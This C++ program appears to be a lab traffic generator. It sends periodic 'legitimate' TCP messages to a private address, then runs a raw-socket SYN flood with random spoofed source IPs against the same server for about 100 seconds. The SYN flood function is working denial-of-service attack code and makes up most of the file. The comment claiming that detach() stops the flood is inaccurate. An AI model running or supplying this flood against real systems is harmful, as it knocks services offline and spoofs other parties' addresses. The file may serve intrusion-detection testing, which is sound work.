#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <chrono>
#include <netinet/tcp.h>
#include <netinet/ip.h>

#define SERVER_IP "192.168.64.3"
#define SERVER_PORT 8080
#define BUFFER_SIZE 1024

void sendLegitimateTraffic() {
    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            return;
        }

        struct sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            return;
        }

        const char* message = "Hello, Server! Legitimate Traffic.";
        send(sock, message, strlen(message), 0);
        char buffer[BUFFER_SIZE] = {0};
        recv(sock, buffer, BUFFER_SIZE, 0);

        std::cout << "Received from server: " << buffer << std::endl;

        close(sock);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void synFloodAttack() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Raw socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &target.sin_addr);

    char packet[40];
    struct iphdr* iph = (struct iphdr*)packet;
    struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));

    while (true) {
        memset(packet, 0, sizeof(packet));

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(40);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand();  // Random source IP
        iph->daddr = target.sin_addr.s_addr;

        // TCP Header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(SERVER_PORT);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        if (sendto(sock, packet, 40, 0, (struct sockaddr*)&target, sizeof(target)) < 0) {
            perror("Packet send failed");
        }
    }
    close(sock);
}

void timedExecution() {
    std::thread legitThread(sendLegitimateTraffic);
    std::this_thread::sleep_for(std::chrono::seconds(20));

    std::thread synThread(synFloodAttack);
    std::this_thread::sleep_for(std::chrono::seconds(100));

    synThread.detach();  // Stop the SYN flood

    std::this_thread::sleep_for(std::chrono::seconds(20));

    pthread_cancel(legitThread.native_handle());  // Stop legitimate traffic
}

int main() {
    timedExecution();
    return 0;
}
